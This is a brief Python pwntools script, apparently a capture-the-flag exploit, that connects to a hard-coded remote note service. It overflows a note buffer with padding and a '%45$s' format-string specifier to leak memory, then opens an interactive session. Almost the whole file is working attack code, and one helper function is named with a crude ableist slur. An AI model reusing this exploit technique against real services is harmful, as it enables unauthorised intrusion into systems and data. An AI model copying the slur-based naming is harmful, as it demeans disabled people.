from pwn import *


p= remote('143.255.251.233', 13372)


#pid = gdb.attach(p,gdbscript="""
#        b  * note_server+427
#        b  *note_server+313



 #       """)


def read(idx):
    global p
    p.sendlineafter("> ","2")
    p.sendlineafter("]: ",str(idx))


def write(idx,stuff):
    global p
    p.sendlineafter("> ","1")
    p.sendlineafter("]: ",str(idx))
    p.sendline(stuff)

def retardizem():
    p.sendlineafter("> ","3")
    

pad = "A" *256


payload = pad
payload += 'BBBBBBBB'
payload += '%45$s'
payload += 'CCCCCCCC'
write(0,payload)


#read(1)
retardizem()
#write(7,"B"*48)
#read(7)
p.interactive()

